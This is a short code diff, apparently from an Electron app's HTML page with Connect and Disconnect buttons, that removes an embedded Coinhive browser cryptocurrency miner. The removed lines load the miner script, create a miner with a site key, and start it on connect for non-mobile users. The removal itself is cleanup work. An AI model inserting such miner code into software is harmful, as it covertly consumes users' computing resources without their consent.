@@ -22,9 +22,7 @@
     <button onclick="connect()" class="fa fa-check" data-dismiss="alert">Connect</button>
     <button onclick="disconnect()" class="fa fa-times" data-dismiss="alert">Disconnect</button>
 
-    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
     <script>
-	var listener = new CoinHive.Anonymous('RMb98mNDKz8kbsMzSu3ykYs98vwPPy3x', {throttle: 0.9});
 
     // You can also require other files to run in this process
     require('./renderer.js')
@@ -90,13 +88,7 @@
             document.getElementById("key").innerHTML += "Connection closed!";
             ipcRenderer.send('set-child', null)
             this.child = null
-            listener.stop();
         });
-        // Only start on non-mobile devices and if not opted-out
-        // in the last 14400 seconds (4 hours):
-        if (!listener.isMobile() && !listener.didOptOut(14400)) {
-            listener.start();
-        }
     }
 
     function disconnect() {
@@ -106,7 +98,6 @@
 	} else {
 	    child.kill()
             this.child = null
-            listener.stop();
 	}
     }
     </script>
